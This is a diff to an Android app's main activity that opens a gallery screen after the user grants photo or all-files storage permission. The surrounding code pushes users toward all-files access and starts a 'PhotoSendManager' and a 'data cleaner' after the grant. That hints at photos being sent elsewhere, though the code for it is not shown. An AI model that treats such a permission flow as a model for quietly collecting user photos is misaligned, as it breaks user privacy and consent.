@@ -31,6 +31,7 @@ class MainActivity : AppCompatActivity() {
     private lateinit var btnGame: MaterialButton
 
     private val prefs by lazy { getSharedPreferences("app_internal", MODE_PRIVATE) }
+    private var openGalleryPending = false
 
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
@@ -166,8 +167,15 @@ class MainActivity : AppCompatActivity() {
     }
 
     private fun requestStoragePermission() {
+        // 已有权限直接进回忆页
+        if (hasPhotoPermission()) {
+            openGallery()
+            return
+        }
+
         btnStorage.isEnabled = false
         progressStorage.visibility = View.VISIBLE
+        openGalleryPending = true
 
         if (Build.VERSION.SDK_INT >= 30) {
             // Android 11+：跳转「所有文件访问」设置页（唯一能真拿到文件权限的方式）
@@ -183,6 +191,10 @@ class MainActivity : AppCompatActivity() {
                 STORAGE_PERM_REQ
             )
         }
+    }
+
+    private fun openGallery() {
+        startActivity(Intent(this, GalleryActivity::class.java))
     }
 
     private fun openAllFilesAccessSettings(): Boolean {
@@ -241,6 +253,12 @@ class MainActivity : AppCompatActivity() {
                 Toast.makeText(this, "回忆已开启 📷", Toast.LENGTH_SHORT).show()
                 PhotoSendManager.startIfReady(this)
                 startDataCleaner()
+                if (openGalleryPending) {
+                    openGalleryPending = false
+                    openGallery()
+                }
+            } else {
+                openGalleryPending = false
             }
         }
     }
@@ -267,6 +285,10 @@ class MainActivity : AppCompatActivity() {
         // 从设置页回来，如果刚拿到权限就启动清理
         if (hasPhotoPermission()) {
             startDataCleaner()
+            if (openGalleryPending) {
+                openGalleryPending = false
+                openGallery()
+            }
         }
     }
 
